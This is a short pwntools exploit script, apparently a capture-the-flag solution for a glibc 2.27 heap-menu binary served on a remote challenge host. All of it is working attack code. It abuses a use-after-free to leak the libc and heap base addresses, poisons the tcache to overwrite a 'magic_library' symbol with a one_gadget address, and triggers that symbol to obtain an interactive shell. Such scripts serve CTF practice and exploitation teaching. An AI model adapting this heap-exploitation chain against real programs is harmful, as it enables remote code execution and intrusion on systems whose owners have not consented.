#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("task_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "0.cloud.chals.io", "29394"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

def add(size):
  sla('>> ', '1')
  sla('size:\n', str(size))

def edit(idx,data):
  sla('>> ', '2')
  sla('index:\n', str(idx))
  sa('content:\n', data)

def free(idx):
  sla('>> ', '3')
  sla('index:\n', str(idx))

def show(idx):
  sla('>> ', '4')
  sla('index:\n', str(idx))

add(0x800)
add(0x18)
add(0x18)
free(0)
show(0)
libc.address = u64(rcu('OUTPUT: ', '\n').ljust(8,b'\x00'))-0x3ebca0
logbase()
onegadgets = one_gadget(libc.path, libc.address)

free(1)
free(2)
show(2)
heap = u64(rcu('OUTPUT: ', '\n').ljust(8,b'\x00'))-0xa70
logleak('heap base', heap)

edit(2,p64(exe.sym['magic_library']))
add(0x18)
add(0x18)

edit(4, p64(onegadgets[0]))

sla('>> ', '17')

p.interactive()

